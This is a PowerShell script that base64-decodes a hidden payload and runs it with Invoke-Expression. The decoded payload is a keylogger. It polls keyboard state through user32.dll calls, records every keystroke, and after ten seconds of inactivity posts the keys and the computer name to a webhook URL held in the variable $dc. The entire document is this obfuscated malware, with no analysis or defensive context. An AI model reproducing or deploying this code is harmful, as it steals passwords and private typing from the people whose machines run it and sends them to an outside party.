$s = "IyBJbXBvcnQgRExMIERlZmluaXRpb25zIGZvciBrZXlib2FyZCBpbnB1dHMNCiRBUEkgPSBAJw0KW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvLCBFeGFjdFNwZWxsaW5nPXRydWUpXSANCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIHNob3J0IEdldEFzeW5jS2V5U3RhdGUoaW50IHZpcnR1YWxLZXlDb2RlKTsgDQpbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgQ2hhclNldD1DaGFyU2V0LkF1dG8pXQ0KcHVibGljIHN0YXRpYyBleHRlcm4gaW50IEdldEtleWJvYXJkU3RhdGUoYnl0ZVtdIGtleXN0YXRlKTsNCltEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0PUNoYXJTZXQuQXV0byldDQpwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgTWFwVmlydHVhbEtleSh1aW50IHVDb2RlLCBpbnQgdU1hcFR5cGUpOw0KW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvKV0NCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBUb1VuaWNvZGUodWludCB3VmlydEtleSwgdWludCB3U2NhbkNvZGUsIGJ5dGVbXSBscGtleXN0YXRlLCBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyIHB3c3pCdWZmLCBpbnQgY2NoQnVmZiwgdWludCB3RmxhZ3MpOw0KJ0ANCiRBUEkgPSBBZGQtVHlwZSAtTWVtYmVyRGVmaW5pdGlvbiAkQVBJIC1OYW1lICdXaW4zMicgLU5hbWVzcGFjZSBBUEkgLVBhc3NUaHJ1DQoNCiMgQWRkIHN0b3B3YXRjaCBmb3IgaW50ZWxsZWdlbnQgc2VuZGluZw0KJExhc3RLZXlwcmVzc1RpbWUgPSBbU3lzdGVtLkRpYWdub3N0aWNzLlN0b3B3YXRjaF06OlN0YXJ0TmV3KCkNCiRLZXlwcmVzc1RocmVzaG9sZCA9IFtUaW1lU3Bhbl06OkZyb21TZWNvbmRzKDEwKQ0KDQojIFN0YXJ0IGEgY29udGludW91cyBsb29wDQpXaGlsZSAoJHRydWUpew0KICAka2V5UHJlc3NlZCA9ICRmYWxzZQ0KICAgIHRyeXsNCiAgICAgICMgU3RhcnQgYSBsb29wIHRoYXQgY2hlY2tzIHRoZSB0aW1lIHNpbmNlIGxhc3QgYWN0aXZpdHkgYmVmb3JlIG1lc3NhZ2UgaXMgc2VudA0KICAgICAgd2hpbGUgKCRMYXN0S2V5cHJlc3NUaW1lLkVsYXBzZWQgLWx0ICRLZXlwcmVzc1RocmVzaG9sZCkgew0KICAgICAgIyBTdGFydCB0aGUgbG9vcCB3aXRoIDMwIG1zIGRlbGF5IGJldHdlZW4ga2V5c3RhdGUgY2hlY2sNCiAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMzANCiAgICAgICAgZm9yICgkYXNjID0gODsgJGFzYyAtbGUgMjU0OyAkYXNjKyspew0KICAgICAgICAjIEdldCB0aGUga2V5IHN0YXRlLiAoaXMgYW55IGtleSBjdXJyZW50bHkgcHJlc3NlZCkNCiAgICAgICAgJGtleXN0ID0gJEFQSTo6R2V0QXN5bmNLZXlTdGF0ZSgkYXNjKQ0KICAgICAgICAgICMgSWYgYSBrZXkgaXMgcHJlc3NlZA0KICAgICAgICAgIGlmICgka2V5c3QgLWVxIC0zMjc2Nykgew0KICAgICAgICAgICMgUmVzdGFydCB0aGUgaW5hY3Rpdml0eSB0aW1lcg0KICAgICAgICAgICRrZXlQcmVzc2VkID0gJHRydWUNCiAgICAgICAgICAkTGFzdEtleXByZXNzVGltZS5SZXN0YXJ0KCkNCiAgICAgICAgICAkbnVsbCA9IFtjb25zb2xlXTo6Q2Fwc0xvY2sNCiAgICAgICAgICAjIFRyYW5zbGF0ZSB0aGUga2V5Y29kZSB0byBhIGxldHRlcg0KICAgICAgICAgICR2dGtleSA9ICRBUEk6Ok1hcFZpcnR1YWxLZXkoJGFzYywgMykNCiAgICAgICAgICAjIEdldCB0aGUga2V5Ym9hcmQgc3RhdGUgYW5kIGNyZWF0ZSBzdHJpbmdidWlsZGVyDQogICAgICAgICAgJGtic3QgPSBOZXctT2JqZWN0IEJ5dGVbXSAyNTYNCiAgICAgICAgICAkY2hlY2trYnN0ID0gJEFQSTo6R2V0S2V5Ym9hcmRTdGF0ZSgka2JzdCkNCiAgICAgICAgICAkbG9nY2hhciA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LlN0cmluZ0J1aWxkZXINCiAgICAgICAgICAgICMgRGVmaW5lIHRoZSBrZXkgdGhhdCB3YXMgcHJlc3NlZCAgICAgICAgICANCiAgICAgICAgICAgIGlmICgkQVBJOjpUb1VuaWNvZGUoJGFzYywgJHZ0a2V5LCAka2JzdCwgJGxvZ2NoYXIsICRsb2djaGFyLkNhcGFjaXR5LCAwKSkgew0KICAgICAgICAgICAgICAjIENoZWNrIGZvciBub24tY2hhcmFjdGVyIGtleXMNCiAgICAgICAgICAgICAgJExTdHJpbmcgPSAkbG9nY2hhci5Ub1N0cmluZygpDQogICAgICAgICAgICAgICAgaWYgKCRhc2MgLWVxIDgpIHskTFN0cmluZyA9ICJbQktTUF0ifQ0KICAgICAgICAgICAgICAgIGlmICgkYXNjIC1lcSAxMykgeyRMU3RyaW5nID0gIltFTlRdIn0NCiAgICAgICAgICAgICAgICBpZiAoJGFzYyAtZXEgMjcpIHskTFN0cmluZyA9ICJbRVNDXSJ9DQogICAgICAgICAgICAjIEFkZCB0aGUga2V5IHRvIHNlbmRpbmcgdmFyaWFibGUNCiAgICAgICAgICAgICRzZW5kICs9ICRMU3RyaW5nIA0KICAgICAgICAgICAgfQ0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0NCiAgICBmaW5hbGx5ew0KICAgICAgSWYgKCRrZXlQcmVzc2VkKSB7DQogICAgICAjIFNlbmQgdGhlIHNhdmVkIGtleXMgdG8gYSB3ZWJob29rDQogICAgICAkZXNjbXNnc3lzID0gJHNlbmQgLXJlcGxhY2UgJ1smPD5dJywgeyRhcmdzWzBdLlZhbHVlLlJlcGxhY2UoJyYnLCAnJmFtcDsnKS5SZXBsYWNlKCc8JywgJyZsdDsnKS5SZXBsYWNlKCc+JywgJyZndDsnKX0NCiAgICAgICR0aW1lc3RhbXAgPSBHZXQtRGF0ZSAtRm9ybWF0ICJkZC1NTS15eXl5IEhIOm1tOnNzIg0KICAgICAgJGVzY21zZyA9ICR0aW1lc3RhbXArIiA6ICIrJ2AnKyRlc2Ntc2dzeXMrJ2AnDQogICAgICAkanNvbnN5cyA9IEB7InVzZXJuYW1lIiA9ICIkZW52OkNPTVBVVEVSTkFNRSIgOyJjb250ZW50IiA9ICRlc2Ntc2d9IHwgQ29udmVydFRvLUpzb24NCiAgICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJGRjIC1NZXRob2QgUG9zdCAtQ29udGVudFR5cGUgImFwcGxpY2F0aW9uL2pzb24iIC1Cb2R5ICRqc29uc3lzDQogICAgICAjUmVtb3ZlIGxvZyBmaWxlIGFuZCByZXNldCBpbmFjdGl2aXR5IGNoZWNrIA0KICAgICAgJHNlbmQgPSAiIg0KICAgICAgJGtleVByZXNzZWQgPSAkZmFsc2UNCiAgICAgIH0NCiAgICB9DQogICMgcmVzZXQgc3RvcHdhdGNoIGJlZm9yZSByZXN0YXJ0aW5nIHRoZSBsb29wDQogICRMYXN0S2V5cHJlc3NUaW1lLlJlc3RhcnQoKQ0KICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDEwDQp9DQo=";$sd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s))
Invoke-Expression $sd
